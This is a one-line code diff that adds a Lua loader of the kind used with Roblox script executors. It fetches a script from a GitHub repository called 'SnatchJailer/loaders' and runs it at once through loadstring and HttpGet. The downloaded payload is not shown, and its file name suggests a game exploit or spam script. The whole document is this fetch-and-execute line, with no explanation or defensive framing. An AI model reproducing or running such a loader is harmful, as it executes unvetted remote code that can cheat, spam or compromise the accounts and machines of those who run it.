@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/rainy-valley-spam7-zzyvxckmfikju1.lua"))()
